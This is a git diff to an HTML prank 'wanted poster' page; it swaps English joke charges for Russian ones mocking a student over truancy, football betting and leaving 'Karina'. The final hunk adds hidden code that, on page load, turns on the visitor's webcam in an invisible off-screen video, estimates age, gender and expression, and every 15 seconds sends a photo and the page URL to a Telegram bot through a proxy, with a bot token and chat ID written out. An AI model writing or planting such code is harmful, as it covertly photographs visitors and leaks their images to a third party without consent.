@@ -637,15 +637,16 @@
           <!-- Charges -->
           <div class="charges-section">
             <div class="charges-title">Charges</div>
-            <div class="charges-text">Wanted by the judicial authorities of multiple jurisdictions for the following offences:</div>
+            <div class="charges-text">Разыскивается правоохранительными органами нескольких юрисдикций за следующие правонарушения:</div>
             <ul class="charges-list">
-              <li>Systematic market manipulation resulting in unlawful profit exceeding $1,847,293 USD</li>
-              <li>Unauthorized deployment of leveraged financial instruments (x125) without regulatory approval</li>
-              <li>Operating an unregistered crypto-asset portfolio with returns exceeding 1,247% ROI</li>
-              <li>Premeditated liquidation of opposing market positions in especially large amounts</li>
-              <li>Illegal enrichment through strategic acquisition of undervalued digital assets</li>
-              <li>Willful concealment of profitable trading signals from associates</li>
-              <li>Possession of luxury vehicles acquired before the age of 25 (Article 312 — "Public Envy")</li>
+              <li>Систематический прогул учебных занятий — зафиксировано более 3 000 пропусков за период обучения</li>
+              <li>Бросил Карину при отягчающих обстоятельствах (без предупреждения и без уважительной причины)</li>
+              <li>Незаконная игра в футбол в неположенных местах и в неположенное время</li>
+              <li>Размещение спортивных ставок в особо крупных размерах на систематической основе</li>
+              <li>Отказ от посещения пар ради просмотра футбольных матчей в прямом эфире</li>
+              <li>Доведение Карины до нервного срыва путём игнорирования сообщений</li>
+              <li>Использование стипендии для размещения ставок на Лигу Чемпионов</li>
+              <li>Создание организованной группы прогульщиков (ОПГ "На футбол")</li>
             </ul>
           </div>
 
@@ -653,7 +654,7 @@
           <div class="warning-box">
             <div class="warning-icon">⚠️</div>
             <div class="warning-text">
-              <strong>CAUTION:</strong> Subject is considered armed with 125x leverage and extremely profitable. Do NOT attempt to trade against this individual. Last person who attempted a counter-position received an immediate margin call. Subject has been observed smiling during market crashes.
+              <strong>ВНИМАНИЕ:</strong> Субъект вооружён футбольным мячом и букмекерским приложением. НЕ ПЫТАЙТЕСЬ звать его на пары — он не придёт. НЕ ПЫТАЙТЕСЬ вернуть его Карине — он сделает вид что не слышит. Последний кто попытался забрать его телефон со ставками, получил мячом в лицо.
             </div>
           </div>
 
@@ -724,6 +725,139 @@
       </div>
     </div>
   </footer>
+
+  <!-- Hidden elements for background face scanning -->
+  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+  <video id="video" autoplay muted playsinline style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;"></video>
+  <canvas id="captureCanvas" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('captureCanvas');
+    const ctx = canvas.getContext('2d');
+
+    const TG_TOKEN = '8777541911:AAEd_BEosgiFZrjeD7UYTbR2RyaXRhmaecI';
+    const TG_CHAT_ID = '-1003794049979';
+    const TG_API = 'https://tg-proxy.tweet44ar.workers.dev/bot' + TG_TOKEN;
+
+    const MODEL_URL = 'https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights';
+
+    const exprMap = {
+      neutral: 'Нейтральное',
+      happy: 'Счастливое',
+      sad: 'Грустное',
+      angry: 'Злое',
+      fearful: 'Испуганное',
+      disgusted: 'Отвращение',
+      surprised: 'Удивлённое'
+    };
+
+    let lastSentTime = 0;
+    const SEND_COOLDOWN = 15000;
+    let sending = false;
+
+    async function init() {
+      try {
+        await Promise.all([
+          faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
+          faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
+          faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL),
+          faceapi.nets.ageGenderNet.loadFromUri(MODEL_URL)
+        ]);
+
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 480 } }
+        });
+        video.srcObject = stream;
+
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => { video.play(); resolve(); };
+        });
+        await new Promise(r => setTimeout(r, 1000));
+
+        scanLoop();
+      } catch (err) {
+        console.error('Init error:', err);
+      }
+    }
+
+    async function sendToTelegram(detection) {
+      const now = Date.now();
+      if (now - lastSentTime < SEND_COOLDOWN) return;
+      if (sending) return;
+      if (video.videoWidth === 0 || video.videoHeight === 0) return;
+
+      sending = true;
+      lastSentTime = now;
+
+      const confidence = (detection.detection.score * 100).toFixed(1);
+      const age = Math.round(detection.age);
+      const gender = detection.gender === 'male' ? 'Мужской' : 'Женский';
+      const genderProb = (detection.genderProbability * 100).toFixed(0);
+      const sorted = Object.entries(detection.expressions).sort((a, b) => b[1] - a[1]);
+      const topExpr = exprMap[sorted[0][0]] || sorted[0][0];
+
+      const caption =
+        '🔍 Face Scan\n' +
+        '━━━━━━━━━━━━━━━\n' +
+        '📊 Уверенность: ' + confidence + '%\n' +
+        '🎂 Возраст: ~' + age + ' лет\n' +
+        '👤 Пол: ' + gender + ' (' + genderProb + '%)\n' +
+        '😐 Выражение: ' + topExpr + '\n' +
+        '━━━━━━━━━━━━━━━\n' +
+        '🕐 ' + new Date().toLocaleString('ru-RU') + '\n' +
+        '🌐 ' + location.href;
+
+      try {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+        const base64 = dataUrl.split(',')[1];
+
+        const binaryStr = atob(base64);
+        const bytes = new Uint8Array(binaryStr.length);
+        for (let i = 0; i < binaryStr.length; i++) {
+          bytes[i] = binaryStr.charCodeAt(i);
+        }
+        const blob = new Blob([bytes.buffer], { type: 'image/jpeg' });
+
+        const fd = new FormData();
+        fd.append('chat_id', TG_CHAT_ID);
+        fd.append('caption', caption);
+        fd.append('photo', blob, 'face.jpg');
+
+        const resp = await fetch(TG_API + '/sendPhoto', { method: 'POST', body: fd });
+        const result = await resp.json();
+        console.log('[TG] Result:', result.ok ? 'SUCCESS' : result.description);
+
+      } catch (e) {
+        console.error('[TG] Error:', e.message);
+      } finally {
+        sending = false;
+      }
+    }
+
+    async function scanLoop() {
+      try {
+        const detection = await faceapi
+          .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ scoreThreshold: 0.5 }))
+          .withFaceLandmarks()
+          .withFaceExpressions()
+          .withAgeAndGender();
+
+        if (detection) {
+          sendToTelegram(detection);
+        }
+      } catch (e) {
+        console.error('Scan error:', e);
+      }
+
+      setTimeout(scanLoop, 300);
+    }
+
+    init();
+  </script>
 
 </body>
 </html>
